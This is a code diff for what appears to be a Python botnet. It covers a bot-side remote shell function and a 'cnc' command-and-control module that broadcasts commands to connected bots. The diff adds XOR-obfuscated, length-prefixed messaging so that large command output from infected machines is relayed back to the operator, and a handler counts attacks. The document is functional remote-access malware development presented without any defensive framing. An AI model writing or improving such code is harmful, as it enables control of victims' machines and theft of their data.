@@ -12,10 +12,19 @@ def shell_exec(cmd, sock):
 			output = output.decode('utf-8')
 			if output == '' or len(output) == 0:
 				output = 'cmd executed without error => ' + cmd
-			sock.send(xor_enc(output,key).encode())
+			send_big_data(output,sock)
 		except:
-			sock.send(xor_enc('Error: cmd exec',key).encode())
-			
+			send_big_data('Error: cmd' + cmd,sock)		
+
+def send_msg(data, sock):
+	sock.send(xor_enc(data,key).encode())
+
+def send_big_data(data, sock):
+	HEADERSIZE=10
+	msg = data
+	msg = xor_enc(msg,key)
+	fullmsg = f'{len(msg):<{HEADERSIZE}}' + msg
+	sock.send(fullmsg.encode())
 
 def handler(sock):
 	...
@@ -29,23 +38,60 @@ def handler(sock):
 					attack+=1
 	...
 	
-	
 
 in cnc file
 
-def SentCmd(data,sock,rlock):
+def ReadLongSocket(sock,length):
+	HEADERSIZE = 10
+	counter = 1
+	data = ''
+	newmsg = True
+	sock.settimeout(10)
+	while True:
+		msg = sock.recv(length).decode()
+		if 'ERwKAQ==' in msg:
+			print('Pong interrupt')
+			continue
 
+		print('Packet:',counter,'received')
+		if newmsg:
+			print(f"expecting: {msg[:HEADERSIZE]} bytes")
+			msglen = int(msg[:HEADERSIZE])
+			newmsg = False
+		print(msg)
+		data += msg
+		counter += 1
+
+		if len(data)-HEADERSIZE == msglen:
+			print('Received all', msglen, 'bytes from message')
+			break
+		elif len(msg) == 0:
+			data += f'\r\nMSG length {msglen} does not match header {len(data)-HEADERSIZE}'
+			break
+	return data[HEADERSIZE:]
+
+def SentCmd(data,sock,rlock,cmdso):
 ...
 		socketList.remove(sock)#del error connection
 		dead += 1
-	if('QBAJA' in data):
+	if(data[:4] == 'QBAJAg'):
 		print('You\'ve got mail:')
 		try:
-			sock.settimeout(1)
-			msg = sock.recv(1024).decode()
+			msg = ReadLongSocket(sock,1024)
 			msg = xor_dec(msg,key)
-			print(msg)
+			msg += '\r\n'
+			length = 1024
+			packmsg = [msg[index:index+length] for index in range(0,len(msg),length)]
+			for pack in packmsg:
+				cmdso.send(pack.encode())
 		except:
-			print('failed')
+			print('Failure to read message')
 	rlock.release()
+...
+
+def SendCmd(cmd,so,rlock):#Send Commands Module
+...
+	for sock in socketList:
+		th = threading.Thread(target=SentCmd,args=(data,sock,rlock,so,))
+		th.start()
 ...
